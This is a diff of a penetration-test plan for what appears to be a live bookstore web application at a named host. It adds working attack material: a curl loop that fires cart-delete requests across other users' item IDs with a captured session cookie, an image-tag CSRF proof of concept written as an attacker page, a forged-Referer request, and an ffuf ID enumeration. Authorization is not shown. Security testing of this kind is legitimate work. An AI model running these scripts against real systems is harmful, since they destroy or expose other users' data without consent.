@@ -128,34 +128,88 @@ ffuf -u "https://webservices.advanceware.net/gironbooksb2c/OrderDetail.aspx?Orde
 
 ---
 
-## Test 4 — Cart Item Manipulation (IDOR on SKU)
+## Test 4 — IDOR + CSRF: Delete Item via GET (CONFIRMED ATTACK SURFACE)
 
-**Goal:** Replace the cart item SKU with another product SKU to get unauthorized pricing or access restricted items.
+**Source:** JavaScript `DeleteItem(ProdId, CombId)` function found in response #179:
+```javascript
+window.location = "ShoppingCart.aspx?id=" + ProdId + "&Delete=True&CombId=" + CombId
+```
 
-**In Burp Repeater (already open from #174):**
-1. The POST body is loaded — find the SKU field (search for `9789501709421`)
-2. Change the value to an adjacent SKU: `9789501709422`, `9789501709420`
-3. Click **Send** — compare response size and price in the response
+**This reveals three findings simultaneously:**
+- State-changing action (`Delete`) performed over **GET** — should be POST (Medium)
+- **`id` (ProdId) is in the URL** — enumerate to delete other users' cart items (High IDOR)
+- No CSRF token on the delete link — forgeable from external site (High CSRF)
+
+### Step 1 — Capture your own ProdId and CombId
+
+In your browser with Burp proxying, click **Remove** on the cart item.
+Burp HTTP History will capture a request like:
+```
+GET /gironbooksb2c/ShoppingCart.aspx?id=XXXXX&Delete=True&CombId=YYYYY
+```
+Note those two values — they are your baseline.
+
+### Step 2 — IDOR: Enumerate other users' ProdId values
 
 ```bash
-# CLI version — paste your ViewState from Burp Repeater Raw tab into VIEWSTATE_VALUE
-# Current known SKU: 9789501709421 ("Companero y sus misterios")
+# Replace YOUR_PROD_ID with the id value you captured above
+# Test adjacent IDs — if the server deletes or returns data for a different user's item, it's IDOR
 
+YOUR_PROD_ID=12345   # <-- replace with real value from Step 1
+YOUR_COMB_ID=0       # <-- replace with real CombId
+
+for prod_id in $(seq $((YOUR_PROD_ID - 10)) $((YOUR_PROD_ID + 10))); do
+  response=$(curl -sk -o /tmp/idor_${prod_id}.html -w "%{http_code}" \
+    -x http://127.0.0.1:8080 \
+    -b "ASP.NET_SessionId=y3u3l2tsaw2fyaj0lnykd5yh" \
+    "https://webservices.advanceware.net/gironbooksb2c/ShoppingCart.aspx?id=${prod_id}&Delete=True&CombId=${YOUR_COMB_ID}")
+  echo "ProdId=${prod_id}: HTTP ${response}"
+done
+```
+
+> **IMPORTANT:** Do NOT run the delete loop against your own live cart items without first adding test items. If the server deletes an item with a different session's ProdId, that is a **Critical IDOR finding**. Stop immediately and document.
+
+### Step 3 — CSRF Proof-of-Concept (safe test, read-only)
+
+A CSRF attack on this endpoint requires no authentication from the victim — a link or image tag on any page can trigger the delete:
+
+```html
+<!-- Attacker page — victim visiting this page while logged in would delete their cart item -->
+<img src="https://webservices.advanceware.net/gironbooksb2c/ShoppingCart.aspx?id=YOUR_PROD_ID&Delete=True&CombId=YOUR_COMB_ID" width="1" height="1">
+```
+
+```bash
+# Simulate CSRF: send delete request with NO Referer header (cross-origin)
 curl -sk -x http://127.0.0.1:8080 \
   -b "ASP.NET_SessionId=y3u3l2tsaw2fyaj0lnykd5yh" \
-  -X POST \
-  "https://webservices.advanceware.net/gironbooksb2c/ShoppingCart.aspx" \
-  --data-urlencode "__EVENTTARGET=" \
-  --data-urlencode "__EVENTARGUMENT=" \
-  --data-urlencode "__LASTFOCUS=" \
-  --data-urlencode "__VIEWSTATE=VIEWSTATE_VALUE" \
-  --data-urlencode "__EVENTVALIDATION=EVENTVALIDATION_VALUE" \
-  --data-urlencode "txtSKU=9789501709422" \
-  --data-urlencode "txtQty=1" \
-  -d "ctl00%24ContentPlaceHolder1%24btnRecalculate=Recalculate" \
-  -o /tmp/cart_sku_swap.html
+  -H "Referer: https://evil-attacker.com" \
+  "https://webservices.advanceware.net/gironbooksb2c/ShoppingCart.aspx?id=YOUR_PROD_ID&Delete=True&CombId=YOUR_COMB_ID" \
+  -o /tmp/csrf_delete_test.html -w "%{http_code}\n"
 
-grep -i "price\|error\|invalid\|total\|11.95\|0.00" /tmp/cart_sku_swap.html | head -20
+# Check if item was removed despite cross-origin Referer
+grep -i "delete\|remove\|cart\|error\|empty" /tmp/csrf_delete_test.html | head -10
+```
+
+**Pass:** Server rejects request with 403 or validates Referer/token.
+**Fail:** Item deleted — document as **High: CSRF on Cart Delete + GET-based State Change**.
+
+### Step 4 — Find Add-to-Cart endpoint via Product_info.aspx (#183)
+
+Request #183 in HTTP History shows `Product_info.aspx` — this is where SKU is passed.
+Click that request → check the URL for `?SKU=` or `?id=` parameter.
+
+```bash
+# Enumerate product IDs on the product info page
+ffuf -u "https://webservices.advanceware.net/gironbooksb2c/Product_info.aspx?id=FUZZ" \
+  -w <(seq 1 5000) \
+  -x http://127.0.0.1:8080 \
+  -H "Cookie: ASP.NET_SessionId=y3u3l2tsaw2fyaj0lnykd5yh" \
+  -mc 200 \
+  -fs 5213 \
+  -o /tmp/ffuf_products.json \
+  -of json
+
+# -fs 5213 filters out the known 5213-byte "not found" response size
 ```
 
 ---
@@ -347,7 +401,9 @@ For OrderID IDOR in Burp GUI:
 | Test 1 — Unauth Order History | Pass / **FAIL** | | |
 | Test 2 — Admin Path Fuzzing | Pass / **FAIL** | | |
 | Test 3 — OrderID IDOR | Pass / **FAIL** | | |
-| Test 4 — SKU Swap | Pass / **FAIL** | | |
+| Test 4a — DELETE via GET (CSRF) | Pass / **FAIL** | | |
+| Test 4b — IDOR on ProdId | Pass / **FAIL** | | |
+| Test 4c — Product_info.aspx enum | Pass / **FAIL** | | |
 | Test 5 — Negative Qty | Pass / **FAIL** | | |
 | Test 6 — Discount Enumeration | Pass / **FAIL** | | |
 | Test 7 — Session Hijack | Pass / **FAIL** | | |
